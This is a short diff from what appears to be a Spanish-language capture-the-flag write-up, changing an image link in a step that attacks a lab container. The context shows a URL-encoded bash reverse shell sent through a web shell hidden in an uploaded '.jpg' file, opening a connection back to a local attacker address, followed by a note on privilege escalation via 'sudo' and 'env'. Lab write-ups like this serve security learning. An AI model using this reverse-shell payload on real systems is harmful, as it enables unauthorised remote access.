@@ -59,7 +59,8 @@ dejamos la terminal asi:
 
 > 172.17.0.2/themes/uploads/675712b70a259.jpg?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/172.17.0.1/443%200%3E%261%22
 
-![[conexion.png]]
+![image](https://github.com/user-attachments/assets/aaf0c7df-4b93-4a68-8979-148e56b1defe)
+
 
 y ahora dentro si hacemos un "sudo -l" vemos que podemos escalar por "env", 
 ![[env.png]]
